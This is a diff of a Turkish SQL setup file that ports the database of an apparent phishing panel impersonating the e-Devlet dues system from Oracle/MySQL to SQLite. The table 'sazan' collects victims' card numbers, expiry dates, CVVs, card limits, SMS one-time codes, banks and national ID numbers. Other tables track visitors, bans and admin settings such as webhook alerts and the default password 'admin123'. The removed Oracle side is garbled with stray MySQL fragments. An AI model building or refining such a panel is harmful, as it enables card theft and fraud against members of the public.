@@ -1,195 +1,109 @@
--- =====================================================
--- E-DEVLET AİDAT SİSTEMİ - VERİTABANI KURULUM
--- =====================================================
--- Oracle SQL'de çalıştırın
--- sqlplus username/password@database @edevletaidat.sql
--- =====================================================
--- Güncelleme: 15 Kasım 2025
--- =====================================================
+-- D1 Uyumlu SQL Şeması
+-- Güncelleme: 16 Kasım 2025
 
--- Not: Bu dosya MySQL için yazılmıştır. Oracle SQL'e dönüştürülmesi gerekiyor.
--- Oracle'da veritabanı yerine tablespace ve schema kullanılır.
+-- Tablo: back
+CREATE TABLE IF NOT EXISTS back (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  back TEXT NOT NULL
+);
+CREATE INDEX IF NOT EXISTS idx_back ON back(back);
 
--- --------------------------------------------------------
+-- Tablo: ban
+CREATE TABLE IF NOT EXISTS ban (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  ban TEXT NOT NULL,
+  ulke TEXT NOT NULL,
+  date_val TEXT NOT NULL,
+  cihaz TEXT NOT NULL,
+  tarayici TEXT NOT NULL
+);
+CREATE INDEX IF NOT EXISTS idx_ban ON ban(ban);
 
---
--- Tablo için tablo yapısı back
---
+-- Tablo: hata1
+CREATE TABLE IF NOT EXISTS hata1 (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  hata1 TEXT NOT NULL
+);
+CREATE INDEX IF NOT EXISTS idx_hata1 ON hata1(hata1);
 
-CREATE TABLE back (
-  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
-  back VARCHAR2(255) NOT NULL
+-- Tablo: hata2
+CREATE TABLE IF NOT EXISTS hata2 (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  hata2 TEXT NOT NULL
+);
+CREATE INDEX IF NOT EXISTS idx_hata2 ON hata2(hata2);
+
+-- Tablo: hata3
+CREATE TABLE IF NOT EXISTS hata3 (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  hata3 TEXT NOT NULL
+);
+CREATE INDEX IF NOT EXISTS idx_hata3 ON hata3(hata3);
+
+-- Tablo: ips
+CREATE TABLE IF NOT EXISTS ips (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  ipAddress TEXT NOT NULL UNIQUE,
+  lastOnline INTEGER NOT NULL
+);
+CREATE INDEX IF NOT EXISTS idx_lastOnline ON ips(lastOnline);
+
+-- Tablo: paneldekiler
+CREATE TABLE IF NOT EXISTS paneldekiler (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  ip TEXT NOT NULL,
+  tarih TEXT NOT NULL,
+  tarayici TEXT NOT NULL,
+  durum TEXT NOT NULL
 );
 
-CREATE INDEX idx_back ON back(back);
+-- Tablo: sazan
+CREATE TABLE IF NOT EXISTS sazan (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  date_val TEXT NOT NULL,
+  kk TEXT,
+  sonkul TEXT,
+  cvv TEXT,
+  kartlimit TEXT,
+  sms TEXT,
+  now TEXT NOT NULL DEFAULT 'Anasayfa',
+  back INTEGER NOT NULL DEFAULT 0,
+  ip TEXT NOT NULL,
+  lastOnline INTEGER,
+  banka TEXT,
+  tc TEXT NOT NULL,
+  cihaz TEXT NOT NULL,
+  tarayici TEXT NOT NULL
+);
+CREATE INDEX IF NOT EXISTS idx_ip ON sazan(ip);
+CREATE INDEX IF NOT EXISTS idx_now ON sazan(now);
 
--- --------------------------------------------------------
---
--- Tablo için tablo yapısı ban
---
-
-CREATE TABLE ban (
-  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
-  ban VARCHAR2(255) NOT NULL,
-  ulke CLOB NOT NULL,
-  date_val VARCHAR2(255) NOT NULL,
-  cihaz VARCHAR2(255) NOT NULL,
-  tarayici VARCHAR2(255) NOT NULL
+-- Tablo: site
+CREATE TABLE IF NOT EXISTS site (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  pass TEXT NOT NULL,
+  kart_sesi INTEGER NOT NULL DEFAULT 0,
+  sms_sesi INTEGER NOT NULL DEFAULT 0,
+  webhook INTEGER NOT NULL DEFAULT 0,
+  webhookURL TEXT NOT NULL,
+  tutar TEXT NOT NULL
 );
 
-CREATE INDEX idx_ban ON ban(ban);
-) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_turkish_ci;
-
---
--- Tablo için tablo yapısı hata1
---
-
-CREATE TABLE hata1 (
-  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
-  hata1 VARCHAR2(255) NOT NULL
-);
-
-CREATE INDEX idx_hata1 ON hata1(hata1);
-  INDEX `idx_hata1` (`hata1`)
-) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
---
--- Tablo için tablo yapısı hata2
---
-
-CREATE TABLE hata2 (
-  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
-  hata2 VARCHAR2(255) NOT NULL
-);
-
-CREATE INDEX idx_hata2 ON hata2(hata2);
-  `hata2` varchar(255) NOT NULL,
-  INDEX `idx_hata2` (`hata2`)
---
--- Tablo için tablo yapısı hata3
---
-
-CREATE TABLE hata3 (
-  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
-  hata3 VARCHAR2(255) NOT NULL
-);
-
-CREATE INDEX idx_hata3 ON hata3(hata3);
-  `id` INT AUTO_INCREMENT PRIMARY KEY,
-  `hata3` varchar(255) NOT NULL,
---
--- Tablo için tablo yapısı ips
---
-
-CREATE TABLE ips (
-  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
-  ipAddress VARCHAR2(255) NOT NULL UNIQUE,
-  lastOnline NUMBER NOT NULL
-);
-
-CREATE INDEX idx_lastOnline ON ips(lastOnline);
-  `ipAddress` varchar(255) NOT NULL,
-  `lastOnline` bigint(255) NOT NULL,
-  UNIQUE KEY `ipAddress` (`ipAddress`),
---
--- Tablo için tablo yapısı paneldekiler
---
-
-CREATE TABLE paneldekiler (
-  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
-  ip CLOB NOT NULL,
-  tarih CLOB NOT NULL,
-  tarayici VARCHAR2(255) NOT NULL,
-  durum CLOB NOT NULL
-);
-  `ip` text NOT NULL,
-  `tarih` text NOT NULL,
-  `tarayici` varchar(255) NOT NULL,
---
--- Tablo için tablo yapısı sazan
---
-
-CREATE TABLE sazan (
-  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
-  date_val VARCHAR2(255) NOT NULL,
-  kk VARCHAR2(255) DEFAULT NULL,
-  sonkul VARCHAR2(255) DEFAULT NULL,
-  cvv VARCHAR2(255) DEFAULT NULL,
-  kartlimit VARCHAR2(50) DEFAULT NULL,
-  sms VARCHAR2(255) DEFAULT NULL,
-  now VARCHAR2(255) DEFAULT 'Anasayfa' NOT NULL,
-  back NUMBER DEFAULT 0 NOT NULL,
-  ip VARCHAR2(255) NOT NULL,
-  lastOnline NUMBER DEFAULT NULL,
-  banka VARCHAR2(255) DEFAULT NULL,
-  tc VARCHAR2(255) NOT NULL,
-  cihaz VARCHAR2(255) NOT NULL,
-  tarayici VARCHAR2(255) NOT NULL
-);
-
-CREATE INDEX idx_ip ON sazan(ip);
-CREATE INDEX idx_now ON sazan(now);
-  `cihaz` varchar(255) NOT NULL,
-  `tarayici` varchar(255) NOT NULL,
---
--- Tablo için tablo yapısı site
---
-
-CREATE TABLE site (
-  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
-  pass CLOB NOT NULL,
-  kart_sesi NUMBER DEFAULT 0 NOT NULL,
-  sms_sesi NUMBER DEFAULT 0 NOT NULL,
-  webhook NUMBER DEFAULT 0 NOT NULL,
-  webhookURL VARCHAR2(255) NOT NULL,
-  tutar VARCHAR2(255) NOT NULL
-);
-
---
--- Tablo döküm verisi site
---
-
+-- Veri: site
 INSERT INTO site (pass, kart_sesi, sms_sesi, webhook, webhookURL, tutar) VALUES
 ('admin123', 0, 0, 0, '.', '150');
---
--- Tablo döküm verisi `site`
---
---
--- Tablo için tablo yapısı sms
---
 
-CREATE TABLE sms (
-  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
-  sms VARCHAR2(255) NOT NULL
+-- Tablo: sms
+CREATE TABLE IF NOT EXISTS sms (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  sms TEXT NOT NULL
 );
+CREATE INDEX IF NOT EXISTS idx_sms ON sms(sms);
 
-CREATE INDEX idx_sms ON sms(sms);
-
-CREATE TABLE `sms` (
---
--- Tablo için tablo yapısı tebrik
---
-
-CREATE TABLE tebrik (
-  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
-  tebrik VARCHAR2(255) NOT NULL
+-- Tablo: tebrik
+CREATE TABLE IF NOT EXISTS tebrik (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  tebrik TEXT NOT NULL
 );
+CREATE INDEX IF NOT EXISTS idx_tebrik ON tebrik(tebrik);
 
-CREATE INDEX idx_tebrik ON tebrik(tebrik);
---
-
-CREATE TABLE `tebrik` (
-  `id` INT AUTO_INCREMENT PRIMARY KEY,
-  `tebrik` varchar(255) NOT NULL,
-  INDEX `idx_tebrik` (`tebrik`)
-) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
-
--- =====================================================
-COMMIT;
--- Admin Panel Şifre: admin123 (değiştirin!)
--- =====================================================
-
-COMMIT;
-
-/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
-/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
-/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
